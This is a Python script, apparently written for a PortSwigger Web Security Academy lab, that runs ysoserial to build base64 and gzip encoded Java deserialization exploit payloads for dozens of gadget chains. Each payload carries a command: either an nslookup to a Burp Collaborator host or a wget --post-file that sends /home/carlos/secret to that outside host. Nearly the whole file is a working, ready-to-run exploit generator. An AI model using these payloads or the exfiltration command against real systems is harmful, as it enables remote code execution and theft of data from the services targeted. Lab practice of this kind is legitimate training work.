#!/bin/python3
import os, random

burp_collab_link = "mg61n8mtphgacgzgcrfnmusk4ba2y1mq.oastify.com" # Used in testing if the command executed # CHANGE

jar_filename = "ysoserial-all.jar"

filename = "exploitsInBase64.txt" # for writing the output
open(filename, 'w').close() # (clear/create) the file

# ysoserial Payloads that will be tried
payloads = ['AspectJWeaver', 'BeanShell1', 'C3P0', 'Click1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'FileUpload1', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JRMPListener', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'Jython1', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'URLDNS', 'Vaadin1', 'Wicket1']


# Generate Exploits
for p in payloads:
    # Distinguish the lookup command by adding a number before the burp collab link.
    rceCommand_nslookup = f"nslookup {p}.{burp_collab_link}"
    rceCommand_exfiltrateFile = f"wget --post-file /home/carlos/secret {p}.{burp_collab_link}"

    cmdOnServer =  rceCommand_nslookup # CHANGE

    os.system(f"echo \#{p} >> {filename}")

    ####### commment 1 of the commands # CHANGE
    # Gzip the base64
    command = f"java -jar {jar_filename} {p} '{cmdOnServer}' | gzip -f | base64 | tr --delete '\\n' >> {filename}"

    # base64 only
    # command = f"java -jar {jar_filename} {p} '{cmdOnServer}' | base64 | tr --delete '\\n' >> {filename}"

    os.system(command)

    for i in range(2): os.system(f"echo >> {filename}") # write 4 lines
